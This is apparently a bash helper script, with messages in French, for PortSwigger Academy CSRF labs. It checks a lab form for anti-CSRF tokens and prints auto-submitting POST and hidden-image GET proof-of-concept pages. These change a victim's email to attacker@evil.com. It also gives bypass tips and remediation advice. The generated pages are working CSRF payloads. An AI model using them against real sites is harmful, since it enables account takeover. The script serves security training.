#!/bin/bash

# PortSwigger CSRF Challenges - Automated Bash Script with Functions and Suggestions
# Usage: Edit the variables below with your target URLs and endpoints.

# --------- Configuration (edit these values) ---------
TARGET_URL="https://<your-lab>.web-security-academy.net"
CSRF_ENDPOINT="/my-account/change-email"
VICTIM_EMAIL="attacker@evil.com"
# -----------------------------------------------------

print_sep() {
    echo "------------------------------------------------------"
}

# 1. Test for anti-CSRF tokens in forms and headers
test_csrf_token_presence() {
    print_sep
    echo "[1] Recherche de token CSRF dans le formulaire cible"
    html=$(curl -sk "$TARGET_URL$CSRF_ENDPOINT")
    if echo "$html" | grep -qi "csrf"; then
        echo ">> [INFO] Un champ ou paramètre lié au CSRF est présent dans le formulaire."
        echo ">> Vérifiez s'il est unique par session/utilisateur et s'il est vérifié côté serveur."
    else
        echo ">> [ALERTE] Aucun token CSRF détecté dans le formulaire !"
        echo ">> PROPOSITION : Implémenter un token CSRF unique par session et vérifié côté serveur."
    fi
}

# 2. Génération d'une PoC HTML pour exploitation CSRF (méthode POST)
generate_csrf_poc_post() {
    print_sep
    echo "[2] Génération d'une preuve de concept CSRF (POST)"
    echo "Utilisez ce code sur un exploit server ou en local pour tester l'exploitabilité :"
    cat <<EOF
<!DOCTYPE html>
<html>
  <body>
    <form action="$TARGET_URL$CSRF_ENDPOINT" method="POST">
      <input type="hidden" name="email" value="$VICTIM_EMAIL">
      <!-- Ajoutez ici un champ csrf si nécessaire, ex: <input type="hidden" name="csrf" value="TOKEN"> -->
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
EOF
    echo ">> [INFO] Modifiez/complétez le champ 'csrf' si la protection est présente mais mal implémentée (voir labs PortSwigger)."
}

# 3. Génération d'une PoC HTML pour exploitation CSRF (méthode GET)
generate_csrf_poc_get() {
    print_sep
    echo "[3] Génération d'une preuve de concept CSRF (GET)"
    echo "Utilisez ce code si l'action vulnérable accepte la méthode GET :"
    cat <<EOF
<!DOCTYPE html>
<html>
  <body>
    <img src="$TARGET_URL$CSRF_ENDPOINT?email=$VICTIM_EMAIL" style="display:none">
  </body>
</html>
EOF
    echo ">> [INFO] Cette technique fonctionne si la modification peut être faite en GET (voir lab PortSwigger sur la validation du token selon la méthode)."
}

# 4. Conseils pour la détection et la validation
csrf_detection_tips() {
    print_sep
    echo "[4] Conseils pour la détection et la validation CSRF"
    echo "- Vérifiez si l'action critique (ex: changement d'email, mot de passe) peut être réalisée sans interaction utilisateur sur le site cible."
    echo "- Si le token CSRF n'est pas lié à la session ou à l'utilisateur, testez la réutilisation d'un token d'un autre utilisateur."
    echo "- Essayez d'automatiser l'envoi de la requête avec et sans le token, ou avec un token périmé."
    echo "- Utilisez Burp Suite > Engagement tools > Generate CSRF PoC pour générer automatiquement une attaque (voir [1][2][4][6][8])."
    echo "- Pour les labs PortSwigger, placez la PoC sur l'exploit server, cliquez sur 'View exploit' pour tester sur vous-même, puis 'Deliver to victim'."
}

# 5. Conseils avancés (bypass, XSS, etc.)
csrf_advanced_info() {
    print_sep
    echo "[5] Conseils avancés et scénarios particuliers"
    echo "- Si un XSS est présent, il peut permettre de voler ou de contourner un token CSRF (voir lab XSS/CSRF [3])."
    echo "- Pour les protections basées sur la méthode, testez POST vs GET (voir [6])."
    echo "- Si le token CSRF n'est pas lié à la session, testez la réutilisation inter-utilisateurs (voir [8])."
    echo "- Pour automatiser, utilisez Burp Suite Scanner ou Burp Repeater pour rejouer les requêtes avec différents tokens."
}

# Main script execution
echo "=== PortSwigger CSRF Automated Checks ==="
test_csrf_token_presence
generate_csrf_poc_post
generate_csrf_poc_get
csrf_detection_tips
csrf_advanced_info

print_sep
echo "[SYNTHÈSE]"
echo "1. Vérifiez la présence et la robustesse du token CSRF dans les formulaires et requêtes critiques."
echo "2. Testez les PoC générées sur l'exploit server PortSwigger pour valider l'exploitabilité."
echo "3. Utilisez Burp Suite pour générer des PoC et automatiser les scénarios avancés."
echo "4. Pour chaque alerte, appliquez les recommandations PortSwigger : token unique, vérifié côté serveur, lié à la session/utilisateur, et non réutilisable."
echo "Documentation PortSwigger : https://portswigger.net/web-security/csrf"
print_sep

# End of script
